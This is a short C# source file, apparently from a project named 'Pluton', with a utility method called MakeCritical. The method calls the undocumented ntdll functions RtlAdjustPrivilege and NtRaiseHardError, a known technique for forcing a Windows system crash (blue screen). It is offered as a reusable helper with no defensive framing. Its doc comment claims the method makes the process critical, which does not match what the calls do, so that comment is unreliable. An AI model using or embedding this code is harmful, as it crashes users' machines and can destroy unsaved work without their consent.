using System;
using System.Runtime.InteropServices;
using static Pluton.Constants.PProcessConstants;

namespace Pluton.Utilities
{
    public class PProcess
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        
        /// <summary>
        /// Make process critical (when you end the process a bsod will appear).
        /// </summary>
        public static void MakeCritical()
        {
            bool t1;
            uint t2;
            RtlAdjustPrivilege(PRIVILEGE, true, false, out t1);
            NtRaiseHardError(ERROR_STATUS, NUMBER_OF_PARAMETERS, UNICODE_STRING_PARAMETER_MASK, IntPtr.Zero, VALID_RESPONSE_OPTION, out t2);
        }
    }
}
